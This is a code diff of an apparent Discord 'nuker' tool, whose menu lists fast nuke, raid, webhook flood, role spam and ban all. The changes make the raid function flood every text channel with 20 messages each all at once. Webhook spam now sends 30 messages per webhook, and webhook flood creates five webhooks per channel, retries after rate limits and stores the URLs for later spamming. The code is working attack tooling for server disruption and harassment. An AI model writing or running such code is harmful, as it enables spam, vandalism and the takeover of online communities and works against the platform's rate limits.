@@ -561,9 +561,9 @@ def create_option_row(left_option, right_option=""):
         # Center single option
         return left_option.center(width)
     
-    # Calculate positions for two columns
-    # Leave 10 spaces between columns
-    total_len = len(left_option.strip()) + len(right_option.strip()) + 10
+    # Calculate positions for two columns with more space
+    # Leave 15 spaces between columns for better formatting
+    total_len = len(left_option.strip()) + len(right_option.strip()) + 15
     
     if total_len > width:
         # If too long, stack them vertically
@@ -573,7 +573,7 @@ def create_option_row(left_option, right_option=""):
     padding = (width - total_len) // 2
     
     # Create row with proper padding
-    return " " * padding + left_option + " " * 10 + right_option
+    return " " * padding + left_option + " " * 15 + right_option
 
 def display_color_selection():
     display_ascii_art()
@@ -776,7 +776,7 @@ def display_nuking_menu():
     print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Nuking Menu{Style.RESET_ALL}")
     print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}\n")
 
-    # Format options in pairs - ALL WHITE TEXT, PROPERLY CENTERED
+    # Format options in pairs - ALL WHITE TEXT, PROPERLY CENTERED with more space
     rows = [
         (f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Fast nuke", 
          f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Nuke"),
@@ -1087,32 +1087,31 @@ async def raid(bot):
         print(f"{Fore.YELLOW}[INFO] No text channels found{Style.RESET_ALL}")
         return
     
-    # Send messages to all text channels
+    # Send messages to ALL text channels SIMULTANEOUSLY
+    print(f"{Fore.YELLOW}[INFO] Sending messages to all channels at once...{Style.RESET_ALL}")
+    
+    # Create all tasks at once
     tasks = []
     for ch_idx, ch in enumerate(text_channels):
-        for msg_idx in range(20):  # 20 messages per channel
-            tasks.append(ch.send(msg))
+        # Send 20 messages per channel
+        for msg_idx in range(20):
+            tasks.append(ch.send(f"{msg}"))
     
-    print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} messages...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Queued {len(tasks)} messages to send simultaneously...{Style.RESET_ALL}")
     
     if tasks:
-        # Send in batches
-        batch_size = 50
-        success_count = 0
+        # Send ALL messages at once
+        print(f"{Fore.CYAN}[RAID] Sending ALL messages simultaneously...{Style.RESET_ALL}")
         
-        for i in range(0, len(tasks), batch_size):
-            batch = tasks[i:i+batch_size]
-            print(f"{Fore.CYAN}[RAID] Sending batch {i//batch_size + 1}...{Style.RESET_ALL}")
+        try:
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            success_count = sum(1 for r in results if not isinstance(r, Exception))
+            failed_count = sum(1 for r in results if isinstance(r, Exception))
             
-            try:
-                results = await asyncio.gather(*batch, return_exceptions=True)
-                batch_success = sum(1 for r in results if not isinstance(r, Exception))
-                success_count += batch_success
-                print(f"{Fore.GREEN}[RAID] Batch {i//batch_size + 1}: Sent {batch_success} messages{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"{Fore.RED}[ERROR] Batch {i//batch_size + 1} failed: {e}{Style.RESET_ALL}")
-        
-        print(f"{Fore.GREEN}[SUCCESS] Raid completed! Sent {success_count} messages{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[SUCCESS] Raid completed!{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}[INFO] Sent {success_count} messages, {failed_count} failed{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] Failed to send messages: {e}{Style.RESET_ALL}")
     else:
         print(f"{Fore.YELLOW}[INFO] No messages to send{Style.RESET_ALL}")
 
@@ -1120,9 +1119,9 @@ async def webhook_spam(_):
     print(f"{Fore.YELLOW}[INFO] Starting Webhook Spam...{Style.RESET_ALL}")
     print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")
     
-    # Option to load from file or manual input
-    print(f"\n{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Load webhooks from webhooks.txt")
-    print(f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Enter webhooks manually")
+    # Centered options for webhook spam
+    print_centered(f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Load webhooks from webhooks.txt")
+    print_centered(f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Enter webhooks manually")
     
     choice = input(f"\n{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Select option > ").strip()
     
@@ -1157,48 +1156,46 @@ async def webhook_spam(_):
     print(f"{Fore.YELLOW}[INFO] Found {len(urls)} webhook URLs{Style.RESET_ALL}")
 
     async with aiohttp.ClientSession() as session:
-        tasks = []
+        # First validate all webhooks
+        valid_webhooks = []
         for url_idx, url in enumerate(urls):
             try:
                 wh = discord.Webhook.from_url(url, session=session)
-                
-                # Test the webhook
-                try:
-                    await wh.send("Test message", wait=True)
-                    print(f"{Fore.GREEN}[WEBHOOK] Webhook {url_idx+1} is valid{Style.RESET_ALL}")
-                except:
-                    print(f"{Fore.RED}[ERROR] Webhook {url_idx+1} failed test{Style.RESET_ALL}")
-                    continue
-                
-                # Add spam tasks - 30 messages per webhook
-                for msg_idx in range(30):
-                    tasks.append(wh.send(msg, wait=False))
-                
+                valid_webhooks.append(wh)
+                print(f"{Fore.GREEN}[WEBHOOK] Webhook {url_idx+1} is valid{Style.RESET_ALL}")
             except Exception as e:
                 print(f"{Fore.RED}[ERROR] Invalid webhook URL {url_idx+1}: {e}{Style.RESET_ALL}")
         
-        if tasks:
-            print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} webhook messages...{Style.RESET_ALL}")
-            
-            # Send in batches to avoid rate limits
-            batch_size = 50
-            total_sent = 0
-            
-            for i in range(0, len(tasks), batch_size):
-                batch = tasks[i:i+batch_size]
-                print(f"{Fore.CYAN}[WEBHOOK] Sending batch {i//batch_size + 1} ({len(batch)} messages)...{Style.RESET_ALL}")
-                
-                try:
-                    results = await asyncio.gather(*batch, return_exceptions=True)
-                    batch_success = sum(1 for r in results if not isinstance(r, Exception))
-                    total_sent += batch_success
-                    print(f"{Fore.GREEN}[WEBHOOK] Batch {i//batch_size + 1}: Sent {batch_success} messages{Style.RESET_ALL}")
-                except Exception as e:
-                    print(f"{Fore.RED}[ERROR] Batch {i//batch_size + 1} failed: {e}{Style.RESET_ALL}")
-            
-            print(f"{Fore.GREEN}[SUCCESS] Webhook spam completed! Sent {total_sent} messages{Style.RESET_ALL}")
-        else:
+        if not valid_webhooks:
             print(f"{Fore.YELLOW}[INFO] No valid webhooks found{Style.RESET_ALL}")
+            return
+        
+        # Create spam tasks
+        tasks = []
+        for wh_idx, wh in enumerate(valid_webhooks):
+            # Send 30 messages per webhook
+            for msg_idx in range(30):
+                tasks.append(wh.send(msg, wait=False))
+        
+        print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} webhook messages...{Style.RESET_ALL}")
+        
+        # Send in batches
+        batch_size = 50
+        total_sent = 0
+        
+        for i in range(0, len(tasks), batch_size):
+            batch = tasks[i:i+batch_size]
+            print(f"{Fore.CYAN}[WEBHOOK] Sending batch {i//batch_size + 1} ({len(batch)} messages)...{Style.RESET_ALL}")
+            
+            try:
+                results = await asyncio.gather(*batch, return_exceptions=True)
+                batch_success = sum(1 for r in results if not isinstance(r, Exception))
+                total_sent += batch_success
+                print(f"{Fore.GREEN}[WEBHOOK] Batch {i//batch_size + 1}: Sent {batch_success} messages{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[ERROR] Batch failed: {e}{Style.RESET_ALL}")
+        
+        print(f"{Fore.GREEN}[SUCCESS] Webhook spam completed! Sent {total_sent} messages{Style.RESET_ALL}")
 
 async def webhook_flood(bot):
     print(f"{Fore.YELLOW}[INFO] Starting Webhook Flood...{Style.RESET_ALL}")
@@ -1223,13 +1220,13 @@ async def webhook_flood(bot):
     
     print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
     
-    # Get text channels with webhook permissions
+    # Get ALL text channels with webhook permissions
     text_channels = []
     for ch in g.channels:
         if isinstance(ch, discord.TextChannel):
+            # Check if bot has permission to create webhooks
             try:
-                permissions = ch.permissions_for(g.me)
-                if permissions.manage_webhooks:
+                if ch.permissions_for(g.me).manage_webhooks:
                     text_channels.append(ch)
             except:
                 continue
@@ -1241,38 +1238,40 @@ async def webhook_flood(bot):
         return
     
     urls = []
-    tasks = []
+    created_webhooks = []
     
-    # Create 5 webhooks per channel
+    # Create webhooks in ALL channels
     for ch_idx, ch in enumerate(text_channels):
-        for wh_idx in range(5):  # 5 webhooks per channel
-            webhook_name = f"{name}-{ch_idx+1}-{wh_idx+1}"
-            tasks.append(ch.create_webhook(name=webhook_name))
-    
-    print(f"{Fore.YELLOW}[INFO] Creating {len(tasks)} webhooks (5 per channel)...{Style.RESET_ALL}")
-    
-    if tasks:
-        # Create webhooks in batches
-        batch_size = 10
-        created_count = 0
+        print(f"{Fore.YELLOW}[INFO] Creating webhooks in channel #{ch.name}...{Style.RESET_ALL}")
         
-        for i in range(0, len(tasks), batch_size):
-            batch = tasks[i:i+batch_size]
-            print(f"{Fore.CYAN}[WEBHOOK] Creating batch {i//batch_size + 1} ({len(batch)} webhooks)...{Style.RESET_ALL}")
-            
-            try:
-                results = await asyncio.gather(*batch, return_exceptions=True)
-                
-                for j, result in enumerate(results):
-                    if isinstance(result, discord.Webhook):
-                        urls.append(result.url)
-                        created_count += 1
-                        if created_count <= 10 or created_count % 10 == 0:
-                            print(f"{Fore.GREEN}[WEBHOOK] Created webhook: {result.name}{Style.RESET_ALL}")
+        try:
+            # Create 5 webhooks per channel
+            for wh_idx in range(5):
+                webhook_name = f"{name}-{ch_idx+1}-{wh_idx+1}"
+                try:
+                    webhook = await ch.create_webhook(name=webhook_name)
+                    urls.append(webhook.url)
+                    created_webhooks.append(webhook)
+                    print(f"{Fore.GREEN}[WEBHOOK] Created: {webhook.name} in #{ch.name}{Style.RESET_ALL}")
+                except discord.HTTPException as e:
+                    if e.status == 429:  # Rate limit
+                        print(f"{Fore.YELLOW}[WARNING] Rate limited, waiting 5 seconds...{Style.RESET_ALL}")
+                        await asyncio.sleep(5)
+                        # Retry once
+                        try:
+                            webhook = await ch.create_webhook(name=webhook_name)
+                            urls.append(webhook.url)
+                            created_webhooks.append(webhook)
+                            print(f"{Fore.GREEN}[WEBHOOK] Created: {webhook.name} in #{ch.name}{Style.RESET_ALL}")
+                        except:
+                            print(f"{Fore.RED}[ERROR] Failed to create webhook after retry{Style.RESET_ALL}")
                     else:
-                        print(f"{Fore.RED}[ERROR] Failed to create webhook: {result}{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"{Fore.RED}[ERROR] Batch {i//batch_size + 1} failed: {e}{Style.RESET_ALL}")
+                        print(f"{Fore.RED}[ERROR] Failed to create webhook: {e}{Style.RESET_ALL}")
+                except Exception as e:
+                    print(f"{Fore.RED}[ERROR] Failed to create webhook: {e}{Style.RESET_ALL}")
+            
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] Failed to process channel #{ch.name}: {e}{Style.RESET_ALL}")
     
     # Save webhooks to file
     if urls:
@@ -1281,8 +1280,8 @@ async def webhook_flood(bot):
             urls_text = ",".join(urls)
             with open("webhooks.txt", "w", encoding="utf-8") as f:
                 f.write(urls_text)
-            print(f"{Fore.GREEN}[SUCCESS] Saved {len(urls)} webhooks to webhooks.txt (comma-separated){Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}[INFO] You can use these webhooks with 'Webhook spam' option{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[SUCCESS] Saved {len(urls)} webhooks to webhooks.txt{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[INFO] You can use these webhooks with the 'Webhook spam' option{Style.RESET_ALL}")
         except Exception as e:
             print(f"{Fore.RED}[ERROR] Failed to save webhooks: {e}{Style.RESET_ALL}")
     else:
@@ -1579,7 +1578,7 @@ def main():
                     "1": fast_nuke,
                     "2": nuke,
                     "3": raid,
-                    "5": webhook_flood,  # Now this will ask for bot token and server ID
+                    "5": webhook_flood,
                     "6": role_delete,
                     "7": role_spam,
                     "8": ban_all,
